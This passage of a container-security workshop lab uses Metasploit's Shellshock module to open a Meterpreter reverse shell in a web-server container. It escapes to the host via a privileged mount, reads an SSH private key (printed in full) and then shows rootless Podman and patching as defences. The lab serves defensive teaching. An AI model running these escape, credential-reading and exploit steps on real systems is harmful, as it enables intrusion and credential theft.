+</div>
+<div class="paragraph">
+<p>The output you should see from the command is from the <strong>host operating system</strong></p>
+</div>
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">WARNING: fdisk GPT support is currently new, and therefore in an experimental phase. Use at your own discretion.
+
+Disk /dev/xvda: 21.5 GB, 21474836480 bytes, 41943040 sectors
+Units = sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
+I/O size (minimum/optimal): 512 bytes / 512 bytes
+Disk label type: gpt
+Disk identifier: 2E431796-24CD-41A3-A4CB-7987FFF67072
+
+
+#         Start          End    Size  Type            Name
+ 1         2048         4095      1M  BIOS boot
+ 2         4096     41943006     20G  Linux filesyste</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>And now we can mount the root of the host filesystem by creating a directory and simply mounting the device at that directory</p>
+</div>
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">mkdir /mnt/hack
+mount /dev/xvda2 /mnt/hack
+touch /mnt/hack/hax0red.txt</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>From within the container, validate that you&#8217;re at the top of the host filesystem by issuing a <code>tree</code> command, you should see the whole of the VMs contents scroll by</p>
+</div>
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">cd /mnt/hack &amp;&amp; tree</code></pre>
+</div>
+</div>
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">.
+|-- bin -&gt; usr/bin
+|-- boot
+|   |-- System.map-4.18.0-305.el8.x86_64
+|   |-- config-4.18.0-305.el8.x86_64
+|   |-- efi
+|   |   `-- EFI
+|   |       `-- redhat
+|   |-- grub2
+|   |   |-- device.map
+|   |   |-- fonts
+|   |   |   `-- unicode.pf2
+|   |   |-- grub.cfg
+|   |   |-- grubenv
+|   |   `-- i386-pc
+|   |       |-- acpi.mod
+|   |       |-- adler32.mod
+|   |       |-- affs.mod
+|   |       |-- afs.mod
+|   |       |-- ahci.mod
+|   |       |-- all_video.mod
+|   |       |-- aout.mod
+|   |       |-- appended_signature_test.mod
+...
+    |-- spool
+    |   |-- anacron
+    |   |   |-- cron.daily
+    |   |   |-- cron.monthly
+    |   |   `-- cron.weekly
+    |   |-- cron
+    |   |-- lpd
+    |   |-- mail
+    |   |   |-- ec2-user
+    |   |   `-- student1
+    |   `-- rhsm
+    |       `-- debug
+    |-- tmp
+    |   |-- cloud-init
+    |   |-- systemd-private-7dde33fba5c24ce9b2cf87368937522d-chronyd.service-iti2eg
+    |   |   `-- tmp
+    |   `-- systemd-private-7dde33fba5c24ce9b2cf87368937522d-nginx.service-NWeHPh
+    |       `-- tmp
+    `-- yp</code></pre>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="tabset is-loading">
+<div class="ulist tabs">
+<ul>
+<li>
+<p><a id="tabset7_terminal-1"></a>Terminal 1</p>
+</li>
+</ul>
+</div>
+<div class="content">
+<div class="tab-pane" aria-labelledby="tabset7_terminal-1">
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>And from the left (VM) terminal, run the following command to show that a new file has been created on the host from within the container</p>
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">ls -l /</code></pre>
+</div>
+</div>
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">lrwxrwxrwx.   1 root root    7 Apr 23  2020 bin -&gt; usr/bin
+dr-xr-xr-x.   5 root root 4096 May 28 08:45 boot
+drwxr-xr-x.   2 root root    6 May  4 17:28 data
+drwxr-xr-x.  18 root root 2660 May 28 08:44 dev
+drwxr-xr-x. 106 root root 8192 May 28 08:51 etc
+<mark>-rw-r--r--.   1 root root    0 May 30 08:31 hax0red.txt</mark>
+drwxr-xr-x.   4 root root   38 May 28 08:46 home
+lrwxrwxrwx.   1 root root    7 Apr 23  2020 lib -&gt; usr/lib
+lrwxrwxrwx.   1 root root    9 Apr 23  2020 lib64 -&gt; usr/lib64
+drwxr-xr-x.   2 root root    6 Apr 23  2020 media
+drwxr-xr-x.   2 root root    6 Apr 23  2020 mnt
+drwxr-xr-x.   3 root root   34 May 28 08:49 opt
+dr-xr-xr-x. 141 root root    0 May 28 08:43 proc
+dr-xr-x---.   3 root root  165 May 28 08:49 root
+drwxr-xr-x.  30 root root  820 May 28 09:11 run
+lrwxrwxrwx.   1 root root    8 Apr 23  2020 sbin -&gt; usr/sbin
+drwxr-xr-x.   2 root root    6 Apr 23  2020 srv
+dr-xr-xr-x.  13 root root    0 May 28 08:43 sys
+drwxrwxrwt.  10 root root 4096 May 30 08:31 tmp
+drwxr-xr-x.  12 root root  144 May  4 17:21 usr
+drwxr-xr-x.  20 root root  278 May 28 08:44 var</code></pre>
+</div>
+</div>
+</li>
+</ol>
+</div>
+</div>
+</div>
+</div>
+</li>
+<li>
+<p>And finally, this means that any secrets on the host are exposed or manipulatable by the intruder.  For example, run the following from the <strong>metasploit</strong> terminal:</p>
+<div class="tabset is-loading">
+<div class="ulist tabs">
+<ul>
+<li>
+<p><a id="tabset8_terminal-2"></a>Terminal 2</p>
+</li>
+</ul>
+</div>
+<div class="content">
+<div class="tab-pane" aria-labelledby="tabset8_terminal-2">
+<div class="listingblock console-input">
+<div class="title">Let&#8217;s take a look at some sensitive ssh info</div>
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">echo $(cat /mnt/hack/home/%USER%/.ssh/aws-private.pem)</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Yields all the information about the private key!</p>
+</div>
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">-----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAliPWwD0hWIoyF5XlnTkmuIUgYm/UkXhfdGYZseu8EcdvR7R0 qgucbVX4YVRZEAGkmIz09iqi1tbGnTO/OL1pnp39i8N5h8qwdIy9yODnHxVU7/9Q 1H+EBfFi9WJuipT6KtcGLOktUP12HVkeWSWCr20/p/MoUYAX0rid58JCB9/OjiHl sIUQe/0R6SFr0dVbuYT0rmmjectwwXJxJPw7wpUkdvCDT1W5Omyq33GnzYSSIZvy u2WNUDU9EWXWxcA9vCNmMrR0KXeKKjTKA5hTpR3koRYtkm44MVR8AtBi8ugfcjF8 mOQaKjOrxcF+Ac3xpLv2iVBPUesVF3g9qk9dLQIDAQABAoIBAG7jwXTysXJHf3/U AmcBEwwtpyGNHx7iHP5HeqriRWGMPzBio9gEA2DtoimgtrcPv5W8ZiB6lRLARqlM 0usBWsUAQ4e6tEQK/BDY8kMveQSIKNepZvXLyKLrCf/a13IbXjnN3o3FGuc6jMZY UAXfoooW0nElMp4fUXkdSeMmosZU7p6f39OenYExtkoyTirFMssoxie0dQvMClFF UKCLbdRQb9Va6JyquCQ/M5M3QfJqnCsLAyF8pyGnUwo8kxaRVfWOKxPI+LUdHYQm b1Yg3C1t97i69VEunNcd8mBUYhLo9XJSpfTnf2v/AMqMkMoWrfR92iZBUe40v8ME Z4dGKAECgYEA3yN2h8UobEEY+19hPviWPdmZfQk7VpKVqseoSxKJ2lr5In4utufu 0uGcTDorizJ92aQN10V4hSvpxokr1kK9qubddOfNq7OjAmDKDdzkX6n6T4aYZHwj CylmkqSoVTN0Bw3mfk76ZZIAyWhiTDH5/M+27JNqqf2UuJnuCHigSa0CgYEArEBC 02BLmwdMIeYh8/TWHWLfjMxIfJX30ctrUhuFqVrs55pOLKmkhVWUpjjmzRLz246h ulWJz271vPiQKRIqYpAIBIiXC9QsT5d4Nq33/1RMEUq2EaC2hzpZSbJnQMHJIzoh Rgy+zQKpExko+iNk5BTeCSf0B8niD3GxKY900YECgYAwgR706HCfB4+MpPEYpSTT kQeCXI1fhkGue/QjTYZVxsy9KLyy2bvab1xwXXy1p2Yf9z9i+iD2odMRayPyUVO1 YLXnAbR9jHD0xWFmnguul95nhxR9U1ayyG8ZlV1aF/MyzVy7PCPGDHTLUzt64Ko8 wFI9HtZi2VKIxj0t7jq5iQKBgQCsK2cgJGYtxPOCBqb1U0oZAVT1RNNHRBb6qdrR rRTCnFGjhYaR+daqN0pngwSfAkygrkZVG16t6fjSM5jUlIWtEs4Qyf5AIolP3NSZ wvXZTobh2c12fS80p0vL7/hor8m93kKX4/FqtTgOEN32eB5GI91zRW4TwuSkDz3H js5zAQKBgFLrkdCJ9bEf/ex3bm5mKfBf53rfkAQlJx7/qEP4oEzq5Wl6py66or/x SahGKZZJkY4fnr9PKa2aRL4TVpeh0llBhmCY8RrTdkOnD3xa9yQ9OHrvrnnX4Z18 FB1vN+pecKNOU0GI1xcg1NxkbEsiA//XasmGICpvJkwMdYne+ciL -----END RSA PRIVATE KEY-----</code></pre>
+</div>
+</div>
+</div>
+</div>
+</div>
+</li>
+</ol>
+</div>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="run_containers_responsibly"><a class="anchor" href="#run_containers_responsibly"></a>Run containers responsibly</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Following the <a href="https://en.wikipedia.org/wiki/Principle_of_least_privilege" target="_blank" rel="noopener">principle of least privilege</a>, there is a lot we could have done to limit the damage of any attacker such as:</p>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p>don&#8217;t run privileged containers</p>
+</li>
+<li>
+<p>use SELinux to fine tune container access to volume mounts</p>
+</li>
+<li>
+<p>don&#8217;t run containers as root</p>
+</li>
+<li>
+<p>ensure that your containers do not include known vulnerabilities or CVEs</p>
+</li>
+</ul>
+</div>
+<div class="paragraph">
+<p>For the purposes of this lab, we&#8217;re only going to investigate the last two items on this list.</p>
+</div>
+<div class="sect2">
+<h3 id="non_root_containers"><a class="anchor" href="#non_root_containers"></a>Non-root containers</h3>
+<div class="paragraph">
+<p>Most containerization runtimes, such as Docker, effectively require all containers to run as root by way of the Docker daemon on the system.</p>
+</div>
+<div class="paragraph">
+<p>Podman is different in that regard.  Because it does not rely on a root-level service to be active to be able to run a container, containers can instead be run as normal users on the system.  How it does this is a bit beyond the scope of this workshop, but in short it does this through linux user namespace mapping.</p>
+</div>
+<div class="paragraph">
+<p>When running as a non-root user on the host system, any container that is setup to run as root (like our apache webserver container) will present instead as the user who started the container to the host system.  This can further limit exposure of the host system.  Let&#8217;s try this out.</p>
+</div>
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>First, before we do anything else, be sure to shutdown the currently running container</p>
+<div class="tabset is-loading">
+<div class="ulist tabs">
+<ul>
+<li>
+<p><a id="tabset9_terminal-1"></a>Terminal 1</p>
+</li>
+</ul>
+</div>
+<div class="content">
+<div class="tab-pane" aria-labelledby="tabset9_terminal-1">
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">podman rm -f my-web-server</code></pre>
+</div>
+</div>
+</div>
+</div>
+</div>
+</li>
+<li>
+<p>Once you enter that command to kill (and remove) the container, you&#8217;ll notice the following in your metasploit terminal</p>
+<div class="tabset is-loading">
+<div class="ulist tabs">
+<ul>
+<li>
+<p><a id="tabset10_terminal-2"></a>Terminal 2</p>
+</li>
+</ul>
+</div>
+<div class="content">
+<div class="tab-pane" aria-labelledby="tabset10_terminal-2">
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">[*] 127.0.0.1 - Meterpreter session 1 closed.  Reason: Died</code></pre>
+</div>
+</div>
+</div>
+</div>
+</div>
+</li>
+<li>
+<p>For most of the lab we have been running as the <code>root</code> user.  We&#8217;re now going to run some commands to make sure we fall back to running as a normal unprivileged user</p>
+<div class="tabset is-loading">
+<div class="ulist tabs">
+<ul>
+<li>
+<p><a id="tabset11_terminal-1"></a>Terminal 1</p>
+</li>
+</ul>
+</div>
+<div class="content">
+<div class="tab-pane" aria-labelledby="tabset11_terminal-1">
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>First confirm that you are currently the <code>root</code> user</p>
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">whoami</code></pre>
+</div>
+</div>
+</li>
+<li>
+<p>ensure the you see the following (if not you may have already logged out)</p>
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">root</code></pre>
+</div>
+</div>
+</li>
+<li>
+<p>then run the following command to exit <code>sudo</code> session</p>
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">exit</code></pre>
+</div>
+</div>
+</li>
+<li>
+<p>Check to ensure you are no longer the root user in the terminal by running the following command</p>
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">whoami</code></pre>
+</div>
+</div>
+</li>
+<li>
+<p>Ensure that the output of the command is the following:</p>
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">%USER%</code></pre>
+</div>
+</div>
+<div class="sidebarblock">
+<div class="content">
+<div class="title">TIP</div>
+<div class="paragraph">
+<p>If the user displayed as the output of <code>whoami</code> does not match the <code>%USER%</code> ensure you followed the instructions <a href="#non_root_containers">here</a> correctly or ask for assistance.</p>
+</div>
+</div>
+</div>
+</li>
+</ol>
+</div>
+</div>
+</div>
+</div>
+</li>
+<li>
+<p>Now we&#8217;ll run our webserver much like we did before but <em>this time as a non-root user</em></p>
+<div class="tabset is-loading">
+<div class="ulist tabs">
+<ul>
+<li>
+<p><a id="tabset12_terminal-1"></a>Terminal 1</p>
+</li>
+</ul>
+</div>
+<div class="content">
+<div class="tab-pane" aria-labelledby="tabset12_terminal-1">
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">podman run \
+    --privileged \<i class="conum" data-value="1"></i><b>(1)</b>
+    -d \
+    -p 8081:80/tcp \
+    --name my-web-server \
+    -v /home/%USER%/container-workshop:/var/log/www:Z \
+    quay.io/bfarr/container-workshop-httpd:0.0.6</code></pre>
+</div>
+</div>
+<div class="colist arabic">
+<table>
+<tr>
+<td><i class="conum" data-value="1"></i><b>1</b></td>
+<td>Despite what we learned in the previous sections about the risks inherent in running with <code>--privileged</code> we are going to use that flag again when running the container rootlessly.  You&#8217;ll see soon why this is OK</td>
+</tr>
+</table>
+</div>
+</div>
+</div>
+</div>
+</li>
+</ol>
+</div>
+<div class="admonitionblock note">
+<table>
+<tr>
+<td class="icon">
+<i class="fa icon-note" title="Note"></i>
+</td>
+<td class="content">
+<div class="paragraph">
+<p>You will notice that the container needs to be downloaded again.  Didn&#8217;t we do this already?  We did, but as <code>root</code>.  Each user keeps their own local container storage separate from all other users.</p>
+</div>
+</td>
+</tr>
+</table>
+</div>
+<div class="paragraph">
+<p>Let&#8217;s return to our metasploit terminal (<strong>Terminal 2</strong>) for the next section</p>
+</div>
+<div class="admonitionblock tip">
+<table>
+<tr>
+<td class="icon">
+<i class="fa icon-tip" title="Tip"></i>
+</td>
+<td class="content">
+<div class="paragraph">
+<p>If you have accidentally closed your metasploit terminal, you can recreate/reopen it by following <a href="metasploit_setup_standalone.html?USER=%USER%&amp;CLUSTER_SUBDOMAIN=%CLUSTER_SUBDOMAIN%" target="_blank" rel="noopener">these instructions</a> fully in the other tab and then returning to this point in the lab.</p>
+</div>
+</td>
+</tr>
+</table>
+</div>
+<div class="paragraph">
+<p>If you&#8217;ve left your terminal open, you may need to first press <kbd>RETURN</kbd> to get back to the metasploit command line.  When you do so you may be greeted with the following prompt:</p>
+</div>
+<div class="tabset is-loading">
+<div class="ulist tabs">
+<ul>
+<li>
+<p><a id="tabset13_terminal-2"></a>Terminal 2</p>
+</li>
+</ul>
+</div>
+<div class="content">
+<div class="tab-pane" aria-labelledby="tabset13_terminal-2">
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">Terminate channel 1? [<mark>y</mark>/N]</code></pre>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="paragraph">
+<p>Just enter <code>y</code> to get back to the metasploit prompt:</p>
+</div>
+<div class="tabset is-loading">
+<div class="ulist tabs">
+<ul>
+<li>
+<p><a id="tabset14_terminal-2"></a>Terminal 2</p>
+</li>
+</ul>
+</div>
+<div class="content">
+<div class="tab-pane" aria-labelledby="tabset14_terminal-2">
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt;</code></pre>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="tabset is-loading">
+<div class="ulist tabs">
+<ul>
+<li>
+<p><a id="tabset15_terminal-2"></a>Terminal 2</p>
+</li>
+</ul>
+</div>
+<div class="content">
+<div class="tab-pane" aria-labelledby="tabset15_terminal-2">
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>With all the setup we did previously, you can now simply run this command in this terminal to exploit the vulnerability on the container</p>
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">exploit</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>&#8203;</p>
+</div>
+</li>
+<li>
+<p>After a few moments you should see the following output, ending with the a <code>meterpreter</code> console</p>
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">[-] Handler failed to bind to 13.239.27.229:4444:-  -
+[*] Started reverse TCP handler on 0.0.0.0:4444
+[*] Command Stager progress - 100.46% done (1097/1092 bytes)
+[*] Sending stage (984904 bytes) to 13.239.27.229
+[*] Meterpreter session 1 opened (172.16.249.211:4444 -&gt; 13.239.27.229:42046) at 2021-05-30 07:31:45 +0000
+
+meterpreter &gt;</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>&#8203;</p>
+</div>
+</li>
+<li>
+<p>Next type in the following to get a shell and output something like the following</p>
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">shell</code></pre>
+</div>
+</div>
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">Process 79 created.
+Channel 1 created.</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>&#8203;</p>
+</div>
+</li>
+<li>
+<p>One thing you&#8217;ll notice is a lack of a prompt after the previous output, and even though we don&#8217;t see it, we&#8217;re able to enter bash shell command now.  Just to make our hack more comfortable, paste this command into Terminal 2</p>
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">/usr/bin/script -qc /bin/bash /dev/null</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>&#8203;</p>
+</div>
+<div class="paragraph">
+<p>You should now get a bash style prompt that will look something like this:</p>
+</div>
+</li>
+</ol>
+</div>
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">[root@b0cfa8015a4c cgi-bin]#</code></pre>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="paragraph">
+<p>Now with your shell setup from metasploit, run the following command:</p>
+</div>
+<div class="tabset is-loading">
+<div class="ulist tabs">
+<ul>
+<li>
+<p><a id="tabset16_terminal-2"></a>Terminal 2</p>
+</li>
+</ul>
+</div>
+<div class="content">
+<div class="tab-pane" aria-labelledby="tabset16_terminal-2">
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">touch /var/log/www/hello_from_rootless_podman.txt</code></pre>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="admonitionblock note">
+<table>
+<tr>
+<td class="icon">
+<i class="fa icon-note" title="Note"></i>
+</td>
+<td class="content">
+<div class="paragraph">
+<p>When you create the file, you should see a file appear in the <code>container_workshop</code> in the explorer</p>
+</div>
+</td>
+</tr>
+</table>
+</div>
+<div class="tabset is-loading">
+<div class="ulist tabs">
+<ul>
+<li>
+<p><a id="tabset17_terminal-2"></a>Terminal 2</p>
+</li>
+</ul>
+</div>
+<div class="content">
+<div class="tab-pane" aria-labelledby="tabset17_terminal-2">
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>Run the following command to look at the permissions of the file</p>
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">ls -l /var/log/www/hello_from_rootless_podman.txt</code></pre>
+</div>
+</div>
+</li>
+<li>
+<p>It should appear that the files are created by root</p>
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">-rw-r--r--. 1 <mark>root</mark> <mark>root</mark> 0 Jun 14 13:25 /var/log/www/hello_from_rootless_podman.txt</code></pre>
+</div>
+</div>
+</li>
+<li>
+<p>This makes sense as you are still running in the container as root.  Prove this by running:</p>
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">whoami</code></pre>
+</div>
+</div>
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">root</code></pre>
+</div>
+</div>
+</li>
+</ol>
+</div>
+</div>
+</div>
+</div>
+<div class="paragraph">
+<p>The noteworthy part is what we see on the <strong>host</strong> filesystem.  From the main shell (which is running directly on the host and not in a container), let&#8217;s take a look at the file we created (that recently appeared in the explorer)</p>
+</div>
+<div class="tabset is-loading">
+<div class="ulist tabs">
+<ul>
+<li>
+<p><a id="tabset18_terminal-1"></a>Terminal 1</p>
+</li>
+</ul>
+</div>
+<div class="content">
+<div class="tab-pane" aria-labelledby="tabset18_terminal-1">
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">ls -l /home/%USER%/container-workshop/hello_from_rootless_podman.txt</code></pre>
+</div>
+</div>
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">-rw-r--r--. 1 <mark>student1</mark> <mark>student1</mark> 0 Jun 14 13:25 /home/student1/container-workshop/hello_from_rootless_podman.txt</code></pre>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="paragraph">
+<p>The key here is that unlike before, the files on the host were created as <code>%USER%</code>, that is, the user that ran the <code>podman</code> command and not <code>root</code> as it appeared from inside the container</p>
+</div>
+<div class="paragraph">
+<p>Podman is able to accomplish this through "namespacing" and mapping container UIDs to different UIDs on the host.  Any container running as <code>root</code> when running as rootless podman will always present to the host (such as via volume mounts) as the user that ran the rootless podman command in the first place.</p>
+</div>
+<div class="paragraph">
+<p>This affords an additional layer of (preventative) security as even containers that think they are running as root are not actually running with such privileges on the host</p>
+</div>
+<div class="paragraph">
+<p>Finally, remember how we ran this container with the <code>--privileged</code> flag even though we know that it confers extra powers to the container?  Let&#8217;s try our <code>fdisk</code> trick again</p>
+</div>
+<div class="tabset is-loading">
+<div class="ulist tabs">
+<ul>
+<li>
+<p><a id="tabset19_terminal-2"></a>Terminal 2</p>
+</li>
+</ul>
+</div>
+<div class="content">
+<div class="tab-pane" aria-labelledby="tabset19_terminal-2">
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">fdisk -l</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>But this time it will appear as if we had not run with the <code>--privileged</code> flag at all:</p>
+</div>
+</div>
+</div>
+</div>
+<div class="paragraph">
+<p>This is again due to the fact that the container is not actually running as root on the host system, it is running as <code>%USER%</code> and <code>%USER%</code> does not have permissions to run <code>fdisk</code> normally.  Hence rootless containers afford additional layers of security on top of the ones we indicated already</p>
+</div>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="test_secure_container"><a class="anchor" href="#test_secure_container"></a>Testing our Secure Container</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>In Module II you built a new image and we will now test this with Metasploit.</p>
+</div>
+<div class="paragraph">
+<p>Make sure there are no containers running with the <code>my-web-server</code></p>
+</div>
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">podman rm -f my-web-server</code></pre>
+</div>
+</div>
+<div class="admonitionblock tip">
+<table>
+<tr>
+<td class="icon">
+<i class="fa icon-tip" title="Tip"></i>
+</td>
+<td class="content">
+<div class="paragraph">
+<p>If there were a container running you would see something like:</p>
+</div>
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">17af59003b1f956717b2a90919119b20bca1133e3677999f628f00e026a0079f</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>And if there weren&#8217;t one running you would see something like:</p>
+</div>
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">Error: failed to evict container: "": failed to find container "my-web-server" in state: no container with name or ID my-web-server found: no such container</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>If the output you see is either of the above, it&#8217;s okay to proceed.</p>
+</div>
+</td>
+</tr>
+</table>
+</div>
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>Run the new container "rootlessly" in the terminal by running the following command:</p>
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">podman run \
+    -d \
+    -p 8081:80/tcp \<i class="conum" data-value="1"></i><b>(1)</b>
+    --name my-web-server \
+    -v /home/%USER%/container-workshop:/var/log/www:Z \
+    localhost/container-workshop-httpd-secure</code></pre>
+</div>
+</div>
+<div class="colist arabic">
+<table>
+<tr>
+<td><i class="conum" data-value="1"></i><b>1</b></td>
+<td>Since our new container image is virtually identical to the original one (except for the new bash package) and we&#8217;re forwarding the same ports we can now attempt to exploit the container again with the configuration from before</td>
+</tr>
+</table>
+</div>
+</li>
+</ol>
+</div>
+<div class="paragraph">
+<p>Let&#8217;s return to our metasploit terminal (<strong>Terminal 2</strong>) for the next section</p>
+</div>
+<div class="admonitionblock tip">
+<table>
+<tr>
+<td class="icon">
+<i class="fa icon-tip" title="Tip"></i>
+</td>
+<td class="content">
+<div class="paragraph">
+<p>If you have accidentally closed your metasploit terminal, you can recreate/reopen it by following <a href="metasploit_setup_standalone.html?USER=%USER%&amp;CLUSTER_SUBDOMAIN=%CLUSTER_SUBDOMAIN%" target="_blank" rel="noopener">these instructions</a> fully in the other tab and then returning to this point in the lab.</p>
+</div>
+</td>
+</tr>
+</table>
+</div>
+<div class="paragraph">
+<p>If you&#8217;ve left your terminal open, you may need to first press <kbd>RETURN</kbd> to get back to the metasploit command line.  When you do so you may be greeted with the following prompt:</p>
+</div>
+<div class="tabset is-loading">
+<div class="ulist tabs">
+<ul>
+<li>
+<p><a id="tabset20_terminal-2"></a>Terminal 2</p>
+</li>
+</ul>
+</div>
+<div class="content">
+<div class="tab-pane" aria-labelledby="tabset20_terminal-2">
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">Terminate channel 1? [<mark>y</mark>/N]</code></pre>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="paragraph">
+<p>Just enter <code>y</code> to get back to the metasploit prompt:</p>
+</div>
+<div class="tabset is-loading">
+<div class="ulist tabs">
+<ul>
+<li>
+<p><a id="tabset21_terminal-2"></a>Terminal 2</p>
+</li>
+</ul>
+</div>
+<div class="content">
+<div class="tab-pane" aria-labelledby="tabset21_terminal-2">
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt;</code></pre>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="paragraph">
+<p>Next run the following command in the <strong>metasploit</strong> terminal (<strong>Terminal 2</strong>)</p>
+</div>
+<div class="tabset is-loading">
+<div class="ulist tabs">
+<ul>
+<li>
+<p><a id="tabset22_terminal-2"></a>Terminal 2</p>
+</li>
+</ul>
+</div>
+<div class="content">
+<div class="tab-pane" aria-labelledby="tabset22_terminal-2">
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">check</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>And this should result in the following output:</p>
+</div>
+<div class="listingblock console-output">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">[*] 127.0.0.1:8081 - The target is <mark>not</mark> exploitable.</code></pre>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="paragraph">
+<p>Congratulations!  You&#8217;d fixed the shellshock exploit of the original <code>quay.io/bfarr/container-workshop-httpd</code> container!</p>
+</div>
+<div class="sidebarblock">
+<div class="content">
+<div class="title">TIP</div>
+<div class="paragraph">
+<p>You are now done with metasploit and Terminal 2.  You can close down that terminal with the following commands:</p>
+</div>
+</div>
+</div>
+<div class="tabset is-loading">
+<div class="ulist tabs">
+<ul>
+<li>
+<p><a id="tabset23_terminal-2"></a>Terminal 2</p>
+</li>
+</ul>
+</div>
+<div class="content">
+<div class="tab-pane" aria-labelledby="tabset23_terminal-2">
+<div class="paragraph">
+<p>First exit out of metasploit</p>
+</div>
+<div class="listingblock console-input">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">exit</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Which should return you to the lab instance terminal</p>
